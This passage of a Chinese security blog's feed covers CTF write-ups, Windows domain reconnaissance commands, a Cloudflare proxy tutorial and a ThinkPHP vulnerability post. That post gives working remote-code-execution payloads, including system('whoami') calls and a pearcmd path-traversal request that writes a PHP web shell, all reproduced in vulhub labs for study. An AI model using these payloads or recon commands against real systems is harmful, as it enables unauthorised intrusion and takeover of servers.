  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.print(<span class="hljs-string">&quot;Enter password: &quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">userInput</span> <span class="hljs-operator">=</span> scanner.next();<br>        <span class="hljs-keyword">if</span> (checkPassword(userInput)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Access granted.&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;Access denied!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkPassword</span><span class="hljs-params">(String password)</span> &#123;<br>        <span class="hljs-keyword">return</span> password.length() == <span class="hljs-number">20</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">0</span>) == <span class="hljs-string">&#x27;f&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">11</span>) == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;l&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">6</span>) == <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">3</span>) == <span class="hljs-string">&#x27;g&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">8</span>) == <span class="hljs-string">&#x27;4&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">4</span>) == <span class="hljs-string">&#x27;&#123;&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">9</span>) == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">7</span>) == <span class="hljs-string">&#x27;2&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">10</span>) == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">2</span>) == <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">12</span>) == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">5</span>) == <span class="hljs-string">&#x27;2&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">17</span>) == <span class="hljs-string">&#x27;B&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">14</span>) == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">18</span>) == <span class="hljs-string">&#x27;!&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">16</span>) == <span class="hljs-string">&#x27;_&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">19</span>) == <span class="hljs-string">&#x27;&#125;&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">15</span>) == <span class="hljs-string">&#x27;D&#x27;</span> &amp;&amp;<br>                password.charAt(<span class="hljs-number">13</span>) == <span class="hljs-string">&#x27;W&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这题感觉没什么意思，观察可以发现按顺序就可以得到flag</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h4 id="crypto001"><a href="#crypto001" class="headerlink" title="crypto001"></a>crypto001</h4><p>附件丢了，不过解法应该是偏移为10的凯撒</p><h4 id="crypto002"><a href="#crypto002" class="headerlink" title="crypto002"></a>crypto002</h4><p>010editor打开翻到最后有base64密文d2RmbGFne2RlNjA1YTM3NDZmZGM5MTl9</p><p>解密得到flag</p><p><img src="/images/wangdingcup2024%E6%A8%A1%E6%8B%9F/8.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>日志分析，搜索{即可找到flag</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透2</title>
    <link href="/2024/10/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F2/"/>
    <url>/2024/10/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F2/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/neiwang2/0.png"></p><h3 id="内网渗透："><a href="#内网渗透：" class="headerlink" title="内网渗透："></a>内网渗透：</h3><h4 id="域信息收集命令："><a href="#域信息收集命令：" class="headerlink" title="域信息收集命令："></a>域信息收集命令：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs shell">query user || qwinsta 查看当前在线用户<br>net user 查看本机用户<br>net user /domain 查看域用户<br>net view &amp; net group &quot;domain computers&quot; /domain 查看当前域计算机列表 第二<br>个查的更多<br>net view /domain 查看有几个域<br>net view \\\\dc 查看 dc 域内共享文件<br>net group /domain 查看域里面的组<br>net group &quot;domain admins&quot; /domain 查看域管<br>net localgroup administrators /domain /这个也是查域管，是升级为域控时，<br>本地账户也成为域管<br>net group &quot;domain controllers&quot; /domain 域控<br>net time /domain<br>net config workstation 当前登录域 - 计算机名 - 用户名<br>net use \\\\域控(如 pc.xx.com) password /user:xxx.com\username 相当于这个<br>帐号登录域内主机，可访问资源<br>ipconfig<br>systeminfo<br>tasklist /svc<br>tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist<br>net localgroup administrators &amp;&amp; whoami 查看当前是不是属于管理组<br>netstat -ano<br>nltest /dclist:xx 查看域控<br>whoami /all 查看 Mandatory Label uac 级别和 sid 号<br>net sessoin 查看远程连接 session (需要管理权限)<br>net share 共享目录<br>cmdkey /l 查看保存登陆凭证<br>echo %logonserver% 查看登陆域<br>spn –l administrator spn 记录<br>set 环境变量<br>dsquery server - 查找目录中的 AD DC/LDS 实例<br>dsquery user - 查找目录中的用户<br>dsquery computer 查询所有计算机名称 windows 2003<br>dir /s *.exe 查找指定目录下及子目录下没隐藏文件<br>arp -a<br>查询当前环境<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>利用Cloudflare配置github加速镜像站</title>
    <link href="/2024/10/25/%E5%88%A9%E7%94%A8Cloudflare%E6%90%AD%E5%BB%BAgithub%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F%E7%AB%99/"/>
    <url>/2024/10/25/%E5%88%A9%E7%94%A8Cloudflare%E6%90%AD%E5%BB%BAgithub%E5%8A%A0%E9%80%9F%E9%95%9C%E5%83%8F%E7%AB%99/</url>
    
    <content type="html"><![CDATA[<h4 id="缘由："><a href="#缘由：" class="headerlink" title="缘由："></a>缘由：</h4><p>发现不开代理网站的打开速度太慢了，加载速度也慢，刚好手里有域名，所以配置一个github加速镜像站。</p><p>参考：<a href="https://zhuanlan.zhihu.com/p/667256401">教程 | 使用 CloudFlare 搭建 Github 加速镜像站 - 知乎 (zhihu.com)</a></p><h3 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h3><ol><li>注册一个国内可访问域名</li><li>注册Cloudflare账号   <a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></li></ol><h3 id="1-将腾讯云域名解析到我的github-io"><a href="#1-将腾讯云域名解析到我的github-io" class="headerlink" title="1.将腾讯云域名解析到我的github.io"></a>1.将腾讯云域名解析到我的github.io</h3><p><img src="/images/Cloudflare/7.png"></p><h3 id="2-配置Worker"><a href="#2-配置Worker" class="headerlink" title="2.配置Worker"></a>2.配置Worker</h3><p><img src="/images/Cloudflare/1.png"></p><p>点击Create</p><p><img src="/images/Cloudflare/2.png"></p><p>Create Worker</p><p><img src="/images/Cloudflare/3.png"></p><p>此处名字可以随意写</p><p><img src="/images/Cloudflare/4.png"></p><p>点击Deploy部署</p><p><img src="/images/Cloudflare/5.png"></p><p>点击Edit Code</p><p><img src="/images/Cloudflare/6.png"></p><p>更换代码</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//xxxx 位置写你要镜像的网站的网站</span><br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TELEGRAPH_URL</span> = <span class="hljs-string">&#x27;https://xxxx&#x27;</span>;<br><br><span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">respondWith</span>(<span class="hljs-title function_">handleRequest</span>(event.<span class="hljs-property">request</span>))<br>&#125;)<br><br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleRequest</span>(<span class="hljs-params">request</span>) &#123;<br>  <span class="hljs-keyword">const</span> url = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(request.<span class="hljs-property">url</span>);<br>  url.<span class="hljs-property">host</span> = <span class="hljs-variable constant_">TELEGRAPH_URL</span>.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/^https?:\/\//</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>  <span class="hljs-keyword">const</span> modifiedRequest = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>(url.<span class="hljs-title function_">toString</span>(), &#123;<br>    <span class="hljs-attr">headers</span>: request.<span class="hljs-property">headers</span>,<br>    <span class="hljs-attr">method</span>: request.<span class="hljs-property">method</span>,<br>    <span class="hljs-attr">body</span>: request.<span class="hljs-property">body</span>,<br>    <span class="hljs-attr">redirect</span>: <span class="hljs-string">&#x27;follow&#x27;</span><br>  &#125;);<br><br>  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(modifiedRequest);<br>  <span class="hljs-keyword">const</span> modifiedResponse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(response.<span class="hljs-property">body</span>, response);<br><br>  <span class="hljs-comment">// 添加允许跨域访问的响应头</span><br>  modifiedResponse.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;Access-Control-Allow-Origin&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>);<br><br>  <span class="hljs-keyword">return</span> modifiedResponse;<br>&#125;<br></code></pre></td></tr></table></figure><p>点击右上角Deploy部署</p><p>退回，打开这个Worker-》setting</p><p><img src="/images/Cloudflare/8.png"></p><p>Add一个Domain</p><p>选择Custom domain</p><p><img src="/images/Cloudflare/9.png"></p><p>添加之前腾讯云的域名解析，我的是blog.piiick.top</p><p>等待解析，之后就可以访问了。</p><h3 id="结语："><a href="#结语：" class="headerlink" title="结语："></a>结语：</h3><p>感觉访问是快了不少，但是我的图片显示还是很慢，因为和博客一起上传了，后面有时间整个图床吧。</p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP学习与漏洞分析</title>
    <link href="/2024/10/14/ThinkPHP%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2024/10/14/ThinkPHP%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h4 id="ThinkPHP的部署："><a href="#ThinkPHP的部署：" class="headerlink" title="ThinkPHP的部署："></a>ThinkPHP的部署：</h4><p>我们需要下载composer来部署高版本ThinkPHP，且ThinkPHP6开始只能使用composer来部署</p><p>composer下载地址：<a href="https://getcomposer.org/Composer-Setup.exe">https://getcomposer.org/Composer-Setup.exe</a></p><p>安装：<a href="https://www.runoob.com/w3cnote/composer-install-and-usage.html">Composer 安装与使用 | 菜鸟教程 (runoob.com)</a></p><h4 id="什么是ThinkPHP框架："><a href="#什么是ThinkPHP框架：" class="headerlink" title="什么是ThinkPHP框架："></a>什么是ThinkPHP框架：</h4><p>ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。ThinkPHP可以支持windows&#x2F;Unix&#x2F;Linux等服务器环境，正式版需要PHP5.0以上版本支持，支持MySql、PgSQL、Sqlite多种数据库以及PDO扩展，ThinkPHP框架本身没有什么特别模块要求，具体的应用系统运行环境要求视开发所涉及的模块。</p><h4 id="ThinkPHP2-x-3-0-rce漏洞"><a href="#ThinkPHP2-x-3-0-rce漏洞" class="headerlink" title="ThinkPHP2.x&#x2F;3.0 rce漏洞"></a>ThinkPHP2.x&#x2F;3.0 rce漏洞</h4><p>在<code>/ThinkPHP/Mode/Lite/Dispatcher.class.php</code>中preg_replace的**&#x2F;e**匹配模式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;@(\w+)&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;([^&#x27;</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">&#x27;\/]+)@e&#x27;</span>, <span class="hljs-string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br></code></pre></td></tr></table></figure><p>用户的输入会放在双引号中执行，导致任意命令执行</p><p>在线沙箱测试：<a href="https://onlinephp.io/">PHP Sandbox</a></p><p><img src="/images/ThinkPHP/1.png"></p><p>关于preg_replace的一些性质参考：</p><p><a href="https://xz.aliyun.com/t/2557?time__1311=n4+xni0=G=i=0QDCD0Qxl1aDODg7nKa1dKFe4D">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p><p>漏洞利用</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?s=<span class="hljs-keyword">index</span>/<span class="hljs-keyword">index</span>/name/$&#123;@print(<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-number">1</span>]))&#125;&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">system</span>(%27whoami%27);<br></code></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?s</span>=<span class="hljs-regexp">/index/index</span><span class="hljs-regexp">/name/</span><span class="hljs-variable">$%</span>7B<span class="hljs-variable">@phpinfo</span>()%7D<br></code></pre></td></tr></table></figure><h4 id="ThinkPHP5-5-0-22-5-1-29-rce漏洞"><a href="#ThinkPHP5-5-0-22-5-1-29-rce漏洞" class="headerlink" title="ThinkPHP5 5.0.22&#x2F;5.1.29 rce漏洞"></a>ThinkPHP5 5.0.22&#x2F;5.1.29 rce漏洞</h4><p>环境使用vulhub的漏洞环境5-rce</p><p><img src="/images/ThinkPHP/2.png"></p><p>漏洞复现</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=phpinfo<span class="hljs-variable">&amp;vars</span>[0]=100<br>或<br>?s=/<span class="hljs-keyword">Index</span>/\think\app/invokefunction<span class="hljs-variable">&amp;function</span>=call_user_func_array<span class="hljs-variable">&amp;vars</span>[0]=phpinfo<span class="hljs-variable">&amp;vars</span>[1][]=-1<br></code></pre></td></tr></table></figure><p><img src="/images/ThinkPHP/3.png"></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">?s=/Index/\think\app/invokefunction&amp;<span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">call_user_func_array</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[0]</span>=<span class="hljs-title">system</span>&amp;<span class="hljs-title">vars</span><span class="hljs-params">[1]</span><span class="hljs-params">[]</span>=<span class="hljs-title">whoami</span></span><br></code></pre></td></tr></table></figure><p><img src="/images/ThinkPHP/4.png"></p><h4 id="ThinkPHP5-5-0-23-rce漏洞"><a href="#ThinkPHP5-5-0-23-rce漏洞" class="headerlink" title="ThinkPHP5 5.0.23 rce漏洞"></a>ThinkPHP5 5.0.23 rce漏洞</h4><p>环境使用vulhub的漏洞环境 5.0.23-rce</p><p><img src="/images/ThinkPHP/5.png"></p><p>漏洞复现</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">http:/xxx/<span class="hljs-keyword">index</span>.php?s=captcha<br><br>POST<br>_method=__construct&amp;filter[]=system&amp;<span class="hljs-keyword">method</span>=<span class="hljs-title function_">get</span>&amp;<span class="hljs-title function_">server</span>[<span class="hljs-title function_">REQUEST_METHOD</span>]=<span class="hljs-title function_">ls</span><br></code></pre></td></tr></table></figure><p><img src="/images/ThinkPHP/6.png"></p><h4 id="ThinkPHP-6-0-12-rce漏洞"><a href="#ThinkPHP-6-0-12-rce漏洞" class="headerlink" title="ThinkPHP 6.0.12 rce漏洞"></a>ThinkPHP 6.0.12 rce漏洞</h4><p>环境使用vulhub的漏洞环境 lang-rce</p><p><img src="/images/ThinkPHP/7.png"></p><p>漏洞复现</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?+config-create+/</span>&amp;lang=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/lib/</span>php<span class="hljs-regexp">/pearcmd&amp;/</span>&lt;?=phpinfo()?&gt;+shell.php<br><br>/shell.php<br></code></pre></td></tr></table></figure><p>注意：必须用bp传参，不然&lt;&gt;会被url编码而失效</p><p>错误的</p><p><img src="/images/ThinkPHP/8.png"></p><p>正确的</p><p><img src="/images/ThinkPHP/9.png"></p><p><img src="/images/ThinkPHP/10.png"></p>]]></content>
    
    
    <categories>
      
      <category>php 框架</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo遇到的一点小问题</title>
    <link href="/2024/10/13/hexo%E9%81%87%E5%88%B0%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98/"/>
    <url>/2024/10/13/hexo%E9%81%87%E5%88%B0%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h2><p>太懒了好久没更新博客，刚好想更新一下就在部署时出现了问题，在找遍网络后，最后找到一个解决办法</p><p><a href="https://zhuanlan.zhihu.com/p/521340971">摇：ssh: connect to host github.com port 22: Connection refused - 知乎 (zhihu.com)</a></p><p>22端口超时，只能用443端口了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ vim ~/.ssh/config<br>```<br><span class="hljs-comment"># Add section below to it</span><br>Host github.com<br>  Hostname ssh.github.com<br>  Port 443<br>```<br>$ ssh -T git@github.com<br>Hi xxxxx! You<span class="hljs-string">&#x27;ve successfully authenticated, but GitHub does not</span><br><span class="hljs-string">provide shell access.</span><br></code></pre></td></tr></table></figure><p>修改.ssh&#x2F;中的config，如果没有新建一个即可。</p><p>完美解决！</p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow--php反序列化</title>
    <link href="/2024/09/23/ctfshow--php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/23/ctfshow--php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFSHOW之php反序列化篇"><a href="#CTFSHOW之php反序列化篇" class="headerlink" title="CTFSHOW之php反序列化篇"></a>CTFSHOW之php反序列化篇</h1><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfShowUser</span>();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">checkVip</span>())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">vipOneKeyGetFlag</span>();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">payload:</span><br>?<span class="hljs-attr">username</span><span class="hljs-operator">=</span>xxxxxx<span class="hljs-variable">&amp;password</span>=xxxxxx<br></code></pre></td></tr></table></figure><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span 